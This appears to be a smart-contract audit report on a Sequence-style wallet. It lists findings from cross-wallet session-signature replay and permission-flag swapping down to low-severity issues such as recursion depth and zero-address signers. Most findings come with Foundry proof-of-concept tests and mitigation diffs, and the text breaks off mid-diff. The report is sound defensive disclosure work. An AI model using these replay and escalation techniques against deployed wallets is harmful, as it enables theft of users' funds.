### [H-1] Missing Wallet Binding Enables Cross-Wallet Signature Replay in Session Calls

**Description** `SessionSig.hashCallWithReplayProtection` computes the per-call digest as `keccak256(chainId, space, nonce, callIdx, Payload.hashCall(call))`, omitting the *verifying wallet address*. The digest is fed directly into ecrecover inside `SessionSig.recoverSignature` when reconstructing each CallSignature. 

The surrounding manager, `SessionManager.recoverSapientSignature`, sets **wallet = msg.sender** and enforces various policy checks, but none of those constraints are included in the signed pre-image. As a result, a valid call signature produced for wallet A is indistinguishable (at the signature layer) from the same call executed by wallet B, provided both wallets accept the same imageHash.

This design allows cross-wallet replay: once a session signer issues a call signature for wallet A, any other wallet with the same session configuration can execute the signature unchanged. 

Since SessionManager relies on the recovered session signer address only, the replayed signature satisfies the checks and the call executes as though it were authorized for wallet B. Delegation/permission enforcement is therefore circumvented by copying session call signatures between wallets sharing configuration state.

This violates the protocol's documented invariant that:

```
A signature intended for one particular Sequence wallet cannot be replayed on a different wallet.
```

The root cause of this issue lies in the `hashCallWithReplayProtection` function in the `SessionSig` library, which computes the hash used for session signature verification without including any wallet-specific identifier.

```solidity
function hashCallWithReplayProtection(
    Payload.Decoded calldata payload,
    uint256 callIdx
) public view returns (bytes32 callHash) {
    return keccak256(
      abi.encodePacked(
        payload.noChainId ? 0 : block.chainid,
        payload.space,
        payload.nonce,
        callIdx,
        Payload.hashCall(payload.calls[callIdx])
      )
    );
}
```
**Impact** An attacker can steal funds from any wallet sharing an identical session configuration by replaying a captured session signature from another wallet.

**Proof of Concepts**
1. Create a wallet A with explicit session permissions allowing a specific call (e.g., calling an Emitter contract).
2. Create another wallet B with the same session configuration (same imageHash).
3. Wallet A generates a valid session signature for the allowed call.
4. Wallet B replays the exact same session signature and executes the call successfully, despite not being the original intended signer.

Create a new file and add the following test case in [`ReplaySignature.t.sol`](test/extensions/sessions/ReplaySignature.t.sol)

<details>
<summary>Proof Of Code</summary>

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.27;

import { ExtendedSessionTestBase, Factory } from "../../integrations/extensions/sessions/ExtendedSessionTestBase.sol";

import { Stage1Module } from "src/Stage1Module.sol";
import { SessionPermissions, SessionUsageLimits } from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
import {
  ParameterOperation, ParameterRule, Permission, UsageLimit
} from "src/extensions/sessions/explicit/Permission.sol";
import { Payload } from "src/modules/Payload.sol";
import { Emitter } from "test/mocks/Emitter.sol";
import { PrimitivesRPC } from "test/utils/PrimitivesRPC.sol";

contract ReplaySignature is ExtendedSessionTestBase {

  function test_execute_Replay_Attack() external {
    Emitter emitter = new Emitter();
    Payload.Decoded memory payloadWalletA = _buildPayload(1);

    //creating
    payloadWalletA.calls[0] = Payload.Call({
      to: address(emitter),
      value: 0,
      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
    });

    bytes memory packedPayloadA = PrimitivesRPC.toPackedPayload(vm, payloadWalletA);

    // Session permissions
    SessionPermissions memory sessionPerms = SessionPermissions({
      signer: sessionWallet.addr,
      chainId: block.chainid,
      valueLimit: 0,
      deadline: uint64(block.timestamp + 1 days),
      permissions: new Permission[](1)
    });

    ParameterRule[] memory rule = new ParameterRule[](1);
    rule[0] = ParameterRule({
      cumulative: false,
      operation: ParameterOperation.EQUAL,
      value: bytes32(uint256(uint32(emitter.explicitEmit.selector)) << 224),
      offset: 0, // offset the param (selector is 4 bytes)
      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
    });

    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: rule });

    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
    (Stage1Module walletA, string memory configA, bytes32 imageHashA) = _createWallet(topology);

    Factory secondaryFactory = new Factory();
    Stage1Module secondaryModule = new Stage1Module(address(secondaryFactory), address(entryPoint));
    //deploying another wallet that shares the same configuration as walletA
    Stage1Module walletB = Stage1Module(payable(secondaryFactory.deploy(address(secondaryModule), imageHashA)));

    uint8[] memory permissionIndx = new uint8[](1);
    permissionIndx[0] = 0;
    bytes memory signatureA = _validExplicitSignature(payloadWalletA, sessionWallet, configA, topology, permissionIndx);

    //Execute the payload using the encodedSignature of wallet A -> legitimate
    vm.expectEmit(true, true, true, true, address(emitter));
    emit Emitter.Explicit(address(walletA));
    vm.prank(address(walletA));
    walletA.execute(packedPayloadA, signatureA);

    //Wallet B reusing the signature of wallet A and executing the call
    vm.expectEmit(true, true, true, true, address(emitter));
    emit Emitter.Explicit(address(walletB));
    vm.prank(address(walletB));
    walletB.execute(packedPayloadA, signatureA);
  }

}

```
</details>

**Recommended mitigation** 

1. Bind the verifying wallet to the call hash. For example, include wallet (either the expected wallet address or an EIP-712 domain separator containing it) in `hashCallWithReplayProtection`.
   
2. Alternatively, extend the signed pre-image to match the EIP-712 domain model `(chainId, verifyingContract, wallet, etc.)` so signatures cannot be replayed on contracts with a different msg.sender.
   
3. Consider adding a second-level check in `SessionManager` that rejects signatures whose imageHash was not issued specifically for the calling wallet, rather than only verifying the recovered session signer.

### [M-1] Relayer can escalate privileges by swapping unsigned call flag in `recoverSignature` of `SessionSig.sol`

**Description** The session system's call signatures do not cryptographically bind to the specific permission or attestation being used for validation. The hashCallWithReplayProtection() function computes signature digests using only call parameters and replay protection fields, excluding the permission/attestation selection flag byte. 

Code Example from `SessionSig.sol`:

```solidity
function hashCallWithReplayProtection(
    Payload.Decoded calldata payload,
    uint256 callIdx
  ) public view returns (bytes32 callHash) {
@>  return keccak256(
      abi.encodePacked(
        payload.noChainId ? 0 : block.chainid,
        payload.space,
        payload.nonce,
        callIdx,
        Payload.hashCall(payload.calls[callIdx])
      )
    );
  }
```
This allows relayers to modify the flag byte in encodedSignature to select different permissions or attestations without invalidating the signature.

The vulnerability exists because:

1. SessionSig.recoverSignature() reads the flag byte to determine whether to use implicit/explicit validation and which permission/attestation index to apply

2. SessionSig.hashCallWithReplayProtection() omits the flag byte from the signed digest

3. The same signature remains valid regardless of which permission/attestation is selected, as long as the call parameters are compatible

**Impact** Relayers can escalate privileges by:
1. Switching from restrictive to permissive permissions within the same session
2. Bypassing intended security controls (selector restrictions, parameter rules, value limits)
3. Undermining the authorization semantics of the entire session system

This enables MEV extraction, censorship, and unauthorized actions while appearing to use valid user signatures.

**Proof of Concepts**
The test demonstrates how the same signature works with different permission indices:

Find the below test case in `SessionSig.t.sol`
<details>
<summary>Proof of Code</summary>

```solidity
 function test_FlagByteSwap_ExplicitPermissionIndexNotSigned_AllowsEscalation() external {
    Payload.Decoded memory payload = _buildPayload(1);

    // First call with BEHAVIOR_ABORT_ON_ERROR (should revert)
    payload.calls[0] = Payload.Call({
      to: address(emitter),
      value: 0,
      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR // This should revert
     });

    // Session permissions
    SessionPermissions memory sessionPerms = SessionPermissions({
      signer: sessionWallet.addr,
      chainId: block.chainid,
      valueLimit: 0,
      deadline: uint64(block.timestamp + 1 days),
      permissions: new Permission[](2)
    });

    ParameterRule[] memory rule0 = new ParameterRule[](1);
    // Rules for explicitTarget in call 0.
    rule0[0] = ParameterRule({
      cumulative: false,
      operation: ParameterOperation.EQUAL,
      value: bytes32(uint256(uint32(~emitter.explicitEmit.selector)) << 224),
      offset: 0,
      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
    });

    ParameterRule[] memory rule1 = new ParameterRule[](1);
    rule1[0] = ParameterRule({
      cumulative: false,
      operation: ParameterOperation.EQUAL,
      value: bytes32(uint256(uint32(emitter.explicitEmit.selector)) << 224),
      offset: 0, // offset the param (selector is 4 bytes)
      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
    });

    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: rule0 });
    sessionPerms.permissions[1] = Permission({ target: address(emitter), rules: rule1 }); // Unlimited access

    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
    string memory sessionSignature =
      _signAndEncodeRSV(SessionSig.hashCallWithReplayProtection(payload, 0), sessionWallet);

    {
      uint256 callCount = payload.calls.length;
      string[] memory callSignatures = new string[](callCount);
      callSignatures[0] = _explicitCallSignatureToJSON(0, sessionSignature);
      address[] memory explicitSigners = new address[](1);
      explicitSigners[0] = sessionWallet.addr;
      address[] memory implicitSigners = new address[](0);

      bytes memory encodedSigIdx0 =
        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
      vm.expectRevert();
      sessionManager.recoverSapientSignature(payload, encodedSigIdx0);
    }

    {
      uint256 callCount = payload.calls.length;
      string[] memory callSignatures = new string[](callCount);
      //Changing flag byte to use permission index 1 instead of 0 as sessionSignature is not bound to flag byte thus allowing escalation
  @>  callSignatures[0] = _explicitCallSignatureToJSON(1, sessionSignature);
      address[] memory explicitSigners = new address[](1);
      explicitSigners[0] = sessionWallet.addr;
      address[] memory implicitSigners = new address[](0);

      bytes memory encodedSigIdx1 =
        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);

      sessionManager.recoverSapientSignature(payload, encodedSigIdx1);
    }
  }
```
</details>

**Recommended mitigation** Include the permission/attestation selection in the signed digest:

```diff
function hashCallWithReplayProtection(
    Payload.Decoded calldata payload,
    uint256 callIdx,
+   uint8 callFlag  // Add flag parameter
) public view returns (bytes32 callHash) {
    return keccak256(
        abi.encodePacked(
            payload.noChainId ? 0 : block.chainid,
            payload.space,
            payload.nonce,
            callIdx,
+           callFlag,  // ✅ Include flag in signature
            Payload.hashCall(payload.calls[callIdx])
        )
    );
}

- bytes32 callHash = hashCallWithReplayProtection(payload, i, flag)
+ // Update recovery to pass the flag
+ bytes32 callHash = hashCallWithReplayProtection(payload, i, flag);
```

For stronger protection, include a hash of the specific permission rules or attestation content based on the type of session rather than just the index.

### [L-1] The NESTED flag implementation incorrectly masks bits in `recoverBranch()` of `BaseSig.sol`

**Description** The `NESTED` flag implementation incorrectly masks bits in `recoverBranch()`, swapping the interpretation of external *weight* and *internal threshold*. While the documentation and other flag types **(FLAG_SIGNATURE_SAPIENT, FLAG_SIGNATURE_ERC1271)** consistently use lower 2 bits for weight and upper 2 bits for size/threshold, the `NESTED` flag code reverses this order, creating a critical logic error.

*Documentation pattern followed by all flags:*

ERC-1271: [sizeSize][weight] - upper 2 bits = Signature size size, lower 2 bits = weight
Sapient: [sizeSize][weight] - upper 2 bits = Signature size size, lower 2 bits = weight
NESTED: [internalThreshold][externalWeight] - upper 2 bits = threshold, lower 2 bits = weight

Code Example from `recoverBranch()`

```solidity
function recoverBranch(
    Payload.Decoded memory _payload,
    bytes32 _opHash,
    bytes calldata _signature
  ) internal view returns (uint256 weight, bytes32 root) {
[...]
  if (flag == FLAG_NESTED) {
          // Unused free bits:
          // - XX00 : Weight (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)
          // - 00XX : Threshold (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)

          // Enter a branch of the signature merkle tree
          // but with an internal threshold and an external fixed weight
        
   @>     uint256 externalWeight = uint8(firstByte & 0x0c) >> 2;
          if (externalWeight == 0) {
            (externalWeight, rindex) = _signature.readUint8(rindex);
          }

    @>     uint256 internalThreshold = uint8(firstByte & 0x03);
          if (internalThreshold == 0) {
            (internalThreshold, rindex) = _signature.readUint16(rindex);
          }

          uint256 size;
          (size, rindex) = _signature.readUint24(rindex);
          uint256 nrindex = rindex + size;

          (uint256 internalWeight, bytes32 internalRoot) = recoverBranch(_payload, _opHash, _signature[rindex:nrindex]);
          rindex = nrindex;

          if (internalWeight >= internalThreshold) {
            weight += externalWeight;
          }

          bytes32 node = _leafForNested(internalRoot, internalThreshold, externalWeight);
          root = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;
          continue;
        }
[...]
}
```

**Impact**
1. Confusion among security researchers regarding the correctness of bits allocation.
2. If the documentation is correct over code then this is a critical bug leading to complete breakdown of nested signature security model else this shall be considered a low severity issue.
3. Causing the rejection of valid signatures while invalid ones are accepted.

**Recommended mitigation**
1. Following the layout specified in the documentation while aligning with other flags, this code should be updated as
   
```diff
if (flag == FLAG_NESTED) {
-      uint256 externalWeight = uint8(firstByte & 0x0c) >> 2;
+.     uint256 externalWeight = uint8(firstByte & 0x03);
          if (externalWeight == 0) {
            (externalWeight, rindex) = _signature.readUint8(rindex);
          }

-         uint256 internalThreshold = uint8(firstByte & 0x03);
+         uint256 internalThreshold = uint8(firstByte & 0x0c) >> 2;
          if (internalThreshold == 0) {
            (internalThreshold, rindex) = _signature.readUint16(rindex);
          }
}
```

2. Update the documentation to clearly specify the bit allocation for the `NESTED` flag, ensuring consistency with other flag types if the current implementation is intended.

### [L-2] Potential Stack Exhaustion due to recursive structure

**Description** The recursive structure of `_recoverBranch` of `Recovery.sol`, `recoverBranch` of `BaseSig.sol` and presents a potential risk of exhausting the stack on the Ethereum virtual machine. A limited stack size constrains the Ethereum virtual machine, and each recursive invocation consumes a specific portion of the stack space. In scenarios where the recursion depth is substantial, mainly when the recursive function utilizes a significant number of local variables, as in `_recoverBranch` and `recoverBranch`, this may surpass the Ethereum virtual machine’s stack limit, resulting in transaction failure.

Code Example from `Recovery.sol`

```solidity
  function _recoverBranch(
    address _wallet,
    bytes32 _payloadHash,
    bytes calldata _signature
  ) internal view returns (bool verified, bytes32 root) {
    uint256 rindex;

    while (rindex < _signature.length) {
      
[...]
      if (flag == FLAG_BRANCH) {
        // Read size
        uint256 size;
        (size, rindex) = _signature.readUint24(rindex);

        // Enter a branch of the signature merkle tree
        uint256 nrindex = rindex + size;
@>       (bool nverified, bytes32 nroot) = _recoverBranch(_wallet, _payloadHash, _signature[rindex:nrindex]);
        rindex = nrindex;

        verified = verified || nverified;
        root = LibOptim.fkeccak256(root, nroot);
        continue;
      }

      revert InvalidSignatureFlag(flag);
    }

    return (verified, root);
  }
```

Code Example from `BaseSig.sol`

```solidity
  function recoverBranch(
    Payload.Decoded memory _payload,
    bytes32 _opHash,
    bytes calldata _signature
  ) internal view returns (uint256 weight, bytes32 root) {

    [...]
      // Branch (0x04)
        if (flag == FLAG_BRANCH) {
          // Free bits layout:
          // - XXXX : Size size (0000 = 0 byte, 0001 = 1 byte, 0010 = 2 bytes, ...)

          // Read size
          uint256 sizeSize = uint8(firstByte & 0x0f);
          uint256 size;
          (size, rindex) = _signature.readUintX(rindex, sizeSize);

          // Enter a branch of the signature merkle tree
          uint256 nrindex = rindex + size;

@>        (uint256 nweight, bytes32 node) = recoverBranch(_payload, _opHash, _signature[rindex:nrindex]);
          rindex = nrindex;

          weight += nweight;
          root = LibOptim.fkeccak256(root, node);
          continue;
        }
    [...]
  }
```
It is important to note that this limit may differ among various Ethereum virtual machine implementations or network setups. Consequently, opting for loop-based structures over deep recursion offers a better solution to reduce stack usage.

**Impact** Unbounded recursion depth leading to a *stack too deep error* or, more critically, *gas exhaustion and block gas limit denial-of-service*.

**Recommended mitigation**

1. The primary and most critical fix is to *add depth checks* to the recursive functions to prevent excessive recursion. This can be achieved by introducing a new currentDepth parameter that limits how deep the recursion can go.

```diff
function recoverBranch(
    Payload.Decoded memory _payload,
    bytes32 _opHash,
    bytes calldata _signature,
+   uint256 _currentDepth  // Add depth parameter
) internal view returns (uint256 weight, bytes32 root) {
    
+   // Enforce maximum depth
+   uint256 constant MAX_RECURSION_DEPTH = 64; // Choose based on expected use case
+   require(_currentDepth < MAX_RECURSION_DEPTH, "Recursion depth exceeded");
    
    [...]
    
    if (flag == FLAG_BRANCH) {
        .
        .
        .
        // Recursive call with incremented depth
        (uint256 nweight, bytes32 node) = recoverBranch(
            _payload, 
            _opHash, 
            _signature[rindex:nrindex], 
+           _currentDepth + 1  // Increment depth
        );
        .
        .
        .
    }
    [...]
}
```
2. Alternatively, refactor the recursive functions into iterative ones using explicit stacks or queues to manage state, thereby eliminating recursion altogether. This approach is more complex but effectively mitigates stack exhaustion risks.

### [L-3] Nested `staticcall()` revert in `WebAuthn` library results in incorrect messageHash

**Description** In the `WebAuthn` library, the `verify()` function checks that a valid P256 signature has been provided over the message hash `sha256(authenticatorData ‖ sha256(clientDataJSON))`. This message hash is calculated using the following logic:

1. Compute `sha256(clientDataJSON)`
2. Compute `sha256(authenticatorData ‖ sha256(clientDataJSON))`

Code Example from `WebAuthn.sol`

```solidity
 if result {
        let p := add(mload(auth), 0x20) // Start of `authenticatorData`'s bytes.
        let e := add(p, l) // Location of the word after `authenticatorData`.
        let w := mload(e) // Cache the word after `authenticatorData`.
        // 19. Compute `sha256(clientDataJSON)`.
        // 20. Compute `sha256(authenticatorData ‖ sha256(clientDataJSON))`.
        // forgefmt: disable-next-item
  @>    messageHash := mload(staticcall(gas(),
                    shl(1, staticcall(gas(), 2, o, n, e, 0x20)), p, add(l, 0x20), 0x01, 0x20))
        mstore(e, w) // Restore the word after `authenticatorData`, in case of reuse.
        // `returndatasize()` is `0x20` on `sha256` success, and `0x00` otherwise.
        if iszero(returndatasize()) { invalid() }
      }
```

This calculation involves two nested calls to the SHA256 precompile. The inner call calculates `sha256(clientDataJSON)`, and the outer call calculates `sha256(authenticatorData ‖ sha256(clientDataJSON))`. After both calls, there is a `returndatasize()` check, which ensures that the outer `staticcall()` succeeded, but does not guarantee that the inner `staticcall()` succeeded.

Since the SHA256 precompile's gas cost depends on its input size, the inner `staticcall()` can fail with an out-of-gas error while the outer `staticcall()` succeeds.

Fortunately, this behavior seems unlikely to be exploitable. This is because the return value of the inner call is used as the memory location for the outer call's output. This means that the situation described would result in the final hash placed in memory 0x00, but would be read starting at memory 0x01. So, the overall messageHash would be a SHA256 hash shifted left by one byte, with one random byte coming from memory location 0x20. 

Since this result would not be a direct SHA256 hash, it's unlikely for an attacker to have a valid signature over this malformed messageHash.

**Impact** Potential for incorrect messageHash calculation if the inner `staticcall()` fails, leading to unexpected behavior in signature verification.

**Recommended mitigation** Consider preventing this behavior altogether. For example, consider separating the two nested calls so they each can have their own `returndatasize()` checks.

```solidity
// Compute sha256(clientDataJSON)
+ let innerSuccess := staticcall(gas(), 2, o, n, e, 0x20)
if iszero(returndatasize()) { invalid() }

// Compute sha256(authenticatorData ‖ sha256(clientDataJSON))
let outerSuccess := staticcall(gas(), 2, p, add(l, 0x20), 0x01, 0x20)
if iszero(returndatasize()) { invalid() }

messageHash := mload(e)
``` 

### [L-4] `ERC4337v07` Cannot Receive Native Token

**Description** The `ERC4337v07` contract appears to support native token transfer through its `validateUserOp` function by way of depositing **missingAccountFunds** to *entryPoint* contract. This field allows specifying an ETH value to be sent with `validateUserOp` operation. However, the contract itself is not capable of receiving ETH due to two related limitations:

1. The contract lacks a `receive()` or payable `fallback()` function, which are necessary for a contract to accept native token transfers.
2. The `validateUserOp` function is not marked as `payable`, preventing it from receiving ETH during its execution.
3. The constructor is not marked payable either.

**Impact** The contract will revert upon receiving ETH. This renders any strategy involving native token transfers infeasible under normal execution paths.

**Recommended mitigation**
1. Consider marking the **constructor** as *payable*.
   
2. Additionally (or alternatively), exposing a *receive()* function or marking the existing fallback as payable would enable native token reception. Either approach would resolve the inconsistency and allow the smart wallet to support ETH-based workflows as designed.


### [L-5] Using `ecrecover` directly vulnerable to signature malleability

**Description**  The `ecrecover` function is susceptible to signature malleability. This means that the same message can be signed in multiple ways, allowing an attacker to change the message signature without invalidating it. This can lead to unexpected behavior in smart contracts, such as the loss of funds or the ability to bypass access control. 

<details>
<summary>5 Found Instances</summary>

- Found in src/extensions/recovery/Recovery.sol [Line: 203](src/extensions/recovery/Recovery.sol#L203)

    ```solidity
        address addr = ecrecover(rPayloadHash, v, r, s);
    ```

- Found in src/extensions/sessions/SessionSig.sol [Line: 116](src/extensions/sessions/SessionSig.sol#L116)

    ```solidity
        address recoveredIdentitySigner = ecrecover(attestationHash, v, r, s);
    ```

- Found in src/extensions/sessions/SessionSig.sol [Line: 170](src/extensions/sessions/SessionSig.sol#L170)

    ```solidity
        callSignature.sessionSigner = ecrecover(callHash, v, r, s);
    ```

- Found in src/modules/auth/BaseSig.sol [Line: 233](src/modules/auth/BaseSig.sol#L233)

    ```solidity
        address addr = ecrecover(_opHash, v, r, s);
    ```

- Found in src/modules/auth/BaseSig.sol [Line: 398](src/modules/auth/BaseSig.sol#L398)

    ```solidity
        address addr = ecrecover(keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", _opHash)), v, r, s);
    ```
</details>

**Impact** An attacker could exploit signature malleability to create different valid signatures for the same message, potentially leading to unauthorized actions or fund transfers.

**Recommended mitigation** Consider using OpenZeppelin's ECDSA library instead of the built-in function.

### [L-6] Missing validation for zero address in constructor parameter of `ERC4337v07` contract

**Description** The constructor accepts an `_entryPoint` address parameter but does not validate whether it is the zero address. Passing an invalid (zero) address would lead to an unusable contract instance.


**Impact** If the contract is deployed with a zero `_entryPoint`, all subsequent interactions depending on it may fail or behave unexpectedly, potentially bricking the contract instance or blocking its integration with the **ERC-4337** infrastructure.

**Recommended mitigation**
Add a validation check in the constructor of `ERC4337v07` contract to ensure that `_entryPoint` is not the zero address:

```diff
constructor(address _entryPoint){
+    require(_entryPoint != address(0), "Invalid entry point");
     entryPoint = _entryPoint;
}
```

### [L-7] Lack of domain separation in passkey root calculation in `_rootForPasskey` allows for cross-implementation image hash equivalence

**Description** : The `_rootForPasskey` function computes a configuration root using only the **public key coordinates (x,y), verification flag, and metadata** without including any domain separation parameters. As a result, any other signer implementation that happens to combine the same four inputs with the same hash structure can return the same root for the same inputs.

**Impact** 
1. *Cross-Implementation Confusion:* Systems that approve roots without validating the signer contract address can be tricked into accepting unverified signatures.
   
2. *Versioning Attacks:* Future upgrades cannot cleanly migrate as old and new implementations would produce conflicting roots
   
3. *Off-Chain System Compromise:* Monitoring tools, indexers, and whitelists that track roots without signer context can be bypassed

**Proof of Concepts**
1. Deploy two different signer contracts (e.g., `PasskeysLike1` and `OtherSigner`) that both implement the same root calculation logic in `_rootForPasskey`.
2. Deploy another contract (e.g., `WalletAuthenticator`) that uses these signers to authenticate signatures based on the computed root.
3. Call the `authenticate` function of `WalletAuthenticator` with a signature generated for `PasskeysLike1` and observe that it is also accepted when using `OtherSigner`, demonstrating that the same root is produced by both implementations.

Create a new test file [`RootForPasskey.t.sol`](test/RootForPasskey.t.sol) in the test folder with the following content:
<details>
<summary>Proof of Code</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import { Test } from "forge-std/Test.sol";

/// Minimal interface compatible with Sequence-style sapient signer
interface ISapientCompact {

  function recoverSapientSignatureCompact(bytes32 digest, bytes calldata signature) external view returns (bytes32);

}

library HashUtil {

  function fkeccak(bytes32 a, bytes32 b) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked(a, b));
  }

  // This mirrors Passkeys._rootForPasskey structure (no domain separation!)
  function passkeysLikeRoot(
    bool requireUserVerification,
    bytes32 x,
    bytes32 y,
    bytes32 metadata
  ) internal pure returns (bytes32) {
    bytes32 a = fkeccak(x, y);
    bytes32 ruv = bytes32(uint256(requireUserVerification ? 1 : 0));
    bytes32 b = fkeccak(ruv, metadata);
    return fkeccak(a, b);
  }

}

contract PasskeysLike1 is ISapientCompact {

  function recoverSapientSignatureCompact(bytes32, /*digest*/ bytes calldata signature) external pure returns (bytes32) {
    (bool ruv, bytes32 x, bytes32 y, bytes32 metadata) = abi.decode(signature, (bool, bytes32, bytes32, bytes32));
    return HashUtil.passkeysLikeRoot(ruv, x, y, metadata);
  }

}

contract OtherSiger is ISapientCompact {

  function recoverSapientSignatureCompact(bytes32, /*digest*/ bytes calldata signature) external pure returns (bytes32) {
    (bool ruv, bytes32 x, bytes32 y, bytes32 metadata) = abi.decode(signature, (bool, bytes32, bytes32, bytes32));
    return HashUtil.passkeysLikeRoot(ruv, x, y, metadata);
  }

}

contract WalletRootAuthenticator {

  bytes32 public imageHash;

  //@note storing image hash without including domain separation information
  function setImageHash(
    bytes32 h
  ) external {
    imageHash = h;
  }

  function authenticate(address signer, bytes32 digest, bytes calldata signature) external view returns (bool) {
    bytes32 root = ISapientCompact(signer).recoverSapientSignatureCompact(digest, signature);
    return root == imageHash; // BUG: does not bind signer address/type!
  }

}

contract TestPoc is Test {

  WalletRootAuthenticator walletAuthenticator;
  PasskeysLike1 passkeysLike1;
  OtherSiger otherSiger;

  function setUp() external {
    walletAuthenticator = new WalletRootAuthenticator();
    passkeysLike1 = new PasskeysLike1();
    otherSiger = new OtherSiger();
  }

  function test_authentication_passes_from_malicious_signer() external {
    bytes32 x = keccak256("pubkeyX");
    bytes32 y = keccak256("pubkeyY");
    bytes32 metadata = keccak256("metadata");
    bool ruv = true;
    bytes32 expectedImageHash = HashUtil.passkeysLikeRoot(ruv, x, y, metadata);

    walletAuthenticator.setImageHash(expectedImageHash);
    bytes memory signature = abi.encode(ruv,x,y,metadata);

    bool fromPassKeySigner = walletAuthenticator.authenticate(address(passkeysLike1), bytes32(0), signature);
    bool fromOtherSigner = walletAuthenticator.authenticate(address(otherSiger), bytes32(0), signature);
    
    assertEq(fromPassKeySigner, true);
    assertEq(fromOtherSigner, true);
  }

}

```
</details>

**Recommended mitigation** Mix a constant type/version tag and/or the signer contract address into the root derivation so that a different implementation can never produce the same root for identical (x, y, ruv, metadata).

```solidity
// Example: strong domain separation
bytes32 constant PASSKEYS_V1_DOMAIN = keccak256("SEQUENCE_SAPIENT_PASSKEYS_V1");

function _rootForPasskey(
    bool _requireUserVerification,
    bytes32 _x,
    bytes32 _y,
    bytes32 _metadata
) internal pure returns (bytes32) {
    bytes32 leaf = keccak256(abi.encodePacked("leaf", _x, _y));
    bytes32 ruv  = bytes32(uint256(_requireUserVerification ? 1 : 0));
    bytes32 aux  = keccak256(abi.encodePacked("aux", ruv, _metadata));

    // Include domain tag AND the signer contract address (hardest to spoof)
    return keccak256(
        abi.encodePacked(PASSKEYS_V1_DOMAIN, address(this), leaf, aux)
    );
}
```

### [L-8] Zero-address signer accepted in recovery queue via `queuePayload` of `Recovery.sol` allows unauthorized queue entries with signers as `address(0)`

**Description** The recovery queue authorization mechanism incorrectly accepts ECDSA signature verification failures as valid signatures when the provided signer is `address(0)`. This allows any caller to queue recovery payloads via `queuePayload` for any wallet without possessing valid signatures, potentially enabling storage bloat attacks and unauthorized queue entries.

The `isValidSignature()` function in the `Recovery.sol` contract contains a logic flaw when handling ECDSA signature verification for the zero address. When `ecrecover()` is called with an invalid signature, it returns `address(0)` to indicate failure. However, if the caller provides _signer as `address(0)`, the function incorrectly treats this as a successful match and returns true.

The vulnerability occurs specifically in the ECDSA signature verification path when the signature length is 64 bytes. The code extracts the signature components and calls `ecrecover()`, but fails to distinguish between a legitimate `zero-address signer` and an `ecrecover()` failure.

Code Example from `Recovery.sol`

```solidity
function isValidSignature(
    address _wallet,
    address _signer,
    Payload.Decoded calldata _payload,
    bytes calldata _signature
  ) internal view returns (bool) {
    bytes32 rPayloadHash = recoveryPayloadHash(_wallet, _payload);

    if (_signature.length == 64) {
      // Try an ECDSA signature
      [...]

      address addr = ecrecover(rPayloadHash, v, r, s);

@>    if (addr == _signer) {
        return true;
      }
    }
    [...]
  }
}
```

**Impact** 
1. The primary impact is the ability to create unauthorized queue entries for any wallet under the zero-address signer. 
2. This enables storage bloat attacks where an attacker can spam arbitrary payload hashes into the queuedPayloadHashes mapping, increasing on-chain storage costs and potentially disrupting operational flows that enumerate queued entries. 

**Proof of Concepts**
1. Calling `queuePayload()` with _signer set to `address(0)`
2. Providing any 64-byte garbage data as the signature
3. The `ecrecover()` call fails and returns `address(0)`
4. The comparison `addr == _signer` evaluates to true (both are zero)
5. The function incorrectly authorizes the operation and writes to `timestampForQueuedPayload` and `queuedPayloadHashes`

Find the proof of code in the test file [`Recovery.t.sol`](test/extensions/recovery/Recovery.t.sol):
<details>
<summary>Proof of Code</summary>

```solidity
  function test_queue_payload_with_address_zero_signer(
    address _wallet,
    Payload.Decoded memory _payload,
    uint64 _randomTime
    ) external {

    boundToLegalPayload(_payload);

    vm.warp(_randomTime);
    
    bytes32 r = bytes32(uint256(0));  // Invalid r
    bytes32 s = bytes32(uint256(0));  // Invalid s  
    uint8 v = 27;
    bytes32 yParityAndS = bytes32((uint256(v - 27) << 255) | uint256(s));
    bytes memory signature = abi.encodePacked(r, yParityAndS);
    bytes32 payloadHash = Payload.hashFor(_payload, _wallet);

    vm.expectEmit(true, true, true, true, address(recovery));
    emit Recovery.NewQueuedPayload(_wallet, address(0), payloadHash, block.timestamp);

    recovery.queuePayload(_wallet, address(0),_payload, signature);
  }
```
</details>

**Recommended mitigation** Consider implementing explicit validation to reject the zero address as a valid signer in the ECDSA verification path. One approach would be to add a check that ensures `_signer != address(0)` before proceeding with ECDSA verification, or alternatively, verify that `ecrecover()` returns a non-zero address before comparing it with the provided signer.

```diff
function isValidSignature(
  address _wallet,
  address _signer,
  Payload.Decoded calldata _payload,
  bytes calldata _signature
) internal view returns (bool) {
  bytes32 rPayloadHash = recoveryPayloadHash(_wallet, _payload);

  if (_signature.length == 64) {
    // Try an ECDSA signature
    bytes32 r;
    bytes32 s;
    uint8 v;
    (r, s, v,) = _signature.readRSVCompact(0);

    address addr = ecrecover(rPayloadHash, v, r, s);
-   if (addr == _signer) {
+   if (addr != address(0) && addr == _signer) {
